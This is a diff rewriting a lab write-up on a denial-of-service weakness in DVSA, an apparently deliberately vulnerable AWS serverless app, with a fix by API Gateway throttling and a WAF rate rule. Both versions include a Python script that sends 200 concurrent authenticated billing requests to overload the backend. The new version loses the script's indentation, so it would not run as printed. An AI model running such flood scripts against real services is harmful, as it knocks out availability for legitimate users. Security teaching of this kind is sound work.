@@ -1,298 +1,359 @@
-Lesson 6: Denial of Service (DoS)
-=================================
+# Lesson 6: Denial of Service (DoS)
 
-Overview
------------
+---
 
-This lesson demonstrates a **Denial of Service (DoS)** vulnerability in the DVSA billing system.\
-By sending many concurrent requests, the system becomes unstable and fails to process legitimate requests.
+## 1. Vulnerability Summary
 
-* * * * *
+This lesson demonstrates a **Denial of Service (DoS)** vulnerability in the DVSA billing system.
 
-Goal
--------
+By sending a large number of concurrent requests to the billing API, the backend becomes overloaded, causing:
 
-To show that the billing API can be overwhelmed by multiple requests, and then verify that applying security controls prevents this attack.
+* Slow response times
 
-* * * * *
+* Server errors (500 / 502)
 
-Requirements
----------------
+* Failure to serve legitimate users
 
-Before starting, make sure you have:
+---
 
--   Access to DVSA web application
+## 2. Impact
 
--   Python installed (with `requests` library)
+* System becomes unstable under load
 
--   Browser (Chrome recommended)
+* Legitimate users cannot complete transactions
 
--   Postman (optional)
+* Service availability is compromised
 
-* * * * *
+---
 
-Step-by-Step Reproduction
-----------------------------
+## 3. Root Cause
 
-* * * * *
+The backend lacked proper request control mechanisms:
 
-###  Step 1: Create a New Order
+* No rate limiting at API Gateway
 
-1.  Open the DVSA application
+* No traffic filtering (WAF)
 
-2.  Add any product to cart
+* Unlimited concurrent request handling
 
-3.  Proceed to checkout until you reach the billing page
+This allowed attackers to flood the system with repeated requests.
 
+---
 
-* * * * *
+## 4. Environment
 
-###  Step 2: Capture a Valid Request
+* Application: DVSA
 
-1.  Open **Developer Tools (F12)**
+* Region: us-east-1
 
-2.  Go to **Network tab**
+* API Endpoint:
 
-3.  Perform an action (like shipping or billing)
+  https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order
 
-4.  Find request:
+* Components:
 
-```
-POST /dvsa/order
+  * API Gateway
 
-```
+  * AWS Lambda
 
-1.  Click the request → open **Payload tab**
+  * DynamoDB
 
-2.  Copy:
+### Tools Used:
 
-    -   `order-id`
+* Python (requests library)
 
-    -   request body
+* Browser DevTools (Chrome)
 
-3.  Go to **Headers tab**
+* Postman (optional)
 
-4.  Copy:
+---
 
-    -   `Authorization` token
+## 5. Prerequisites
 
+Before starting:
 
-* * * * *
+* Python installed
+
+* Install requests library:
+
+  pip install requests
+
+* Access to DVSA application
+
+* Valid user account
+
+---
+
+## 6. Step-by-Step Reproduction
+
+### Step 1: Create a New Order
+
+1\. Open DVSA application
+
+2\. Add product to cart
+
+3\. Proceed to checkout
+
+4\. Stop at billing page
+
+---
+
+### Step 2: Capture a Valid Request
+
+1\. Open DevTools (F12)
+
+2\. Go to Network tab
+
+3\. Perform billing action
+
+4\. Find request:
+
+   POST /dvsa/order
+
+5\. Copy:
+
+   * Authorization token
+
+   * Request payload
+
+   * Order ID
+
+---
 
 ### Step 3: Test Request in Postman
 
-1.  Open Postman
+1\. Create POST request:
 
-2.  Create a POST request:
+   https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order
 
-```
-https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order
+2\. Add headers:
 
-```
+   Authorization: <your_token>
 
-1.  Add Headers:
+   Content-Type: application/json
 
-```
-Authorization: <your_token>
-Content-Type: application/json
+3\. Add body:
 
-```
-
-1.  Add Body (raw JSON):
-
-```
 {
-  "action": "billing",
-  "order-id": "<your_order_id>",
-  "data": {
-    "ccn": "4242424242424242",
-    "exp": "03/28",
-    "cvv": "123"
-  }
+
+"action": "billing",
+
+"order-id": "<your_order_id>",
+
+"data": {
+
+"ccn": "4242424242424242",
+
+"exp": "03/28",
+
+"cvv": "123"
+
 }
 
-```
+}
 
-1.  Click **Send**
+4\. Click Send
 
- Expected result:
+Expected result:
 
-```
 "order already made"
 
-```
+Evidence:
 
- This confirms the request is valid
+evidence/step3_normal_request.png
 
-See:
+---
 
+### Step 4: Run DoS Attack Script
 
-[Step 3 normal request](/vulnerabilities/lesson6_dos/evidence/step3_normal_request.png)
+Create file:
 
-
-* * * * *
-
-###  Step 4: Run DoS Attack Script
-
-1.  Create a file:
-
-```
 dos_test.py
 
-```
+Paste:
 
-1.  Paste the following code:
-
-```
 import threading
+
 import requests
 
 url = "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
 
 headers = {
-    "Authorization": "<your_token>",
-    "Content-Type": "application/json"
+
+"Authorization": "<your_token>",
+
+"Content-Type": "application/json"
+
 }
 
 payload = {
-    "action": "billing",
-    "order-id": "<your_order_id>",
-    "data": {
-        "ccn": "4242424242424242",
-        "exp": "03/28",
-        "cvv": "123"
-    }
+
+"action": "billing",
+
+"order-id": "<your_order_id>",
+
+"data": {
+
+"ccn": "4242424242424242",
+
+"exp": "03/28",
+
+"cvv": "123"
+
+}
+
 }
 
 def send_request(i):
-    try:
-        response = requests.post(url, json=payload, headers=headers)
-        print(f"{i}: {response.status_code}")
-    except Exception:
-        print(f"{i}: ERROR")
+
+try:
+
+response = requests.post(url, json=payload, headers=headers)
+
+print(f"{i}: {response.status_code}")
+
+except Exception:
+
+print(f"{i}: ERROR")
 
 threads = []
 
 for i in range(200):
-    t = threading.Thread(target=send_request, args=(i,))
-    threads.append(t)
-    t.start()
+
+t = threading.Thread(target=send_request, args=(i,))
+
+threads.append(t)
+
+t.start()
 
 for t in threads:
-    t.join()
 
-```
+t.join()
 
-1.  Run:
+Run:
 
-```
 python dos_test.py
 
-```
+---
 
-* * * * *
-
-###  Step 5: Observe Attack Result (Before Fix)
-
- Expected:
-
--   Some requests → `200 OK`
-
--   Many requests → `500 / 502`
-
--   Slow responses
-
- Meaning:
-
--   System becomes unstable
-
--   Backend overloaded
-
-See:
-
-[Step 5 dos attack output](/vulnerabilities/lesson6_dos/evidence/step5_dos_attack_output.png)
-
-
-* * * * *
-
-Fix Applied
----------------
-
-### 1\. API Gateway Throttling
-
--   Limit requests per second
-
--   Prevent excessive traffic
-
-See:
-
-[Api gateway](/vulnerabilities/lesson6_dos/evidence/api_gateway_after.png)
-
-
-* * * * *
-
-### 2\. AWS WAF Rate-Based Rule
-
--   Block repeated requests from same IP
-
--   Example: 100 requests per 5 minutes
-
-* * * * *
-
-Step 6: Verify After Fix
---------------------------
-
-1.  Run the same script again:
-
-```
-python dos_test.py
-
-```
+### Step 5: Observe Attack Result (Before Fix)
 
 Expected:
 
-```
-403 Forbidden
+* Some requests → 200 OK
 
-```
+* Many requests → 500 / 502
+
+* Increased latency
 
 Meaning:
 
--   Attack is blocked
+* Backend overloaded
 
--   Requests do NOT reach backend
+* Service unstable
 
-See:
+Evidence:
 
-[Waf block run code output](/vulnerabilities/lesson6_dos/evidence/waf_block.png)
+evidence/step5_dos_attack_output.png
 
+---
 
-* * * * *
+## 7. Fix Strategy
 
-Final Result
---------------
+To prevent DoS attacks:
 
-| Phase | Behavior |
-| --- | --- |
-| Before Fix | 500 errors, unstable system |
-| After Fix | 403 blocked requests |
-| Legitimate User | Works normally |
+1\. API Gateway Throttling
 
-* * * * *
+   * Limit requests per second
 
-Files Included
------------------
+2\. AWS WAF Rate-Based Rules
 
--   `dos_test.py` → DoS attack script
+   * Block repeated requests from same IP
 
--   `evidence/` → Screenshots of each step
+   * Example: 100 requests per 5 minutes
 
-* * * * *
+---
 
-Key Lesson
--------------
+## 8. Code / Configuration Changes
 
-Without request control, serverless systems can be overwhelmed easily.\
-Applying rate limiting and traffic filtering protects system availability.
+* Enabled API Gateway throttling
 
-* * * * *
+* Added AWS WAF rate-based rule
+
+Evidence:
+
+evidence/api_gateway_after.png
+
+---
+
+## 9. Verification After Fix
+
+Run again:
+
+python dos_test.py
+
+Expected:
+
+403 Forbidden
+
+Meaning:
+
+* Requests blocked
+
+* Backend protected
+
+Evidence:
+
+evidence/waf_block.png
+
+---
+
+## 10. Security Analysis
+
+Vulnerability: Denial of Service (DoS)
+
+Attack Method: High concurrent requests
+
+Root Cause: No rate limiting or filtering
+
+Impact: System instability
+
+Fix: Throttling + WAF
+
+Result: Requests blocked, system stable
+
+---
+
+## 11. Lessons Learned
+
+* Serverless systems need traffic control
+
+* Rate limiting is essential for availability
+
+* WAF adds strong protection layer
+
+* Security must include availability, not only data protection
+
+---
+
+## 12. Repository Structure
+
+lesson6_dos/
+
+│
+
+├── README.md
+
+├── dos_test.py
+
+└── evidence/
+
+├── step3_normal_request.png
+
+├── step5_dos_attack_output.png
+
+├── waf_block.png
+
+└── api_gateway_after.png
+
+---
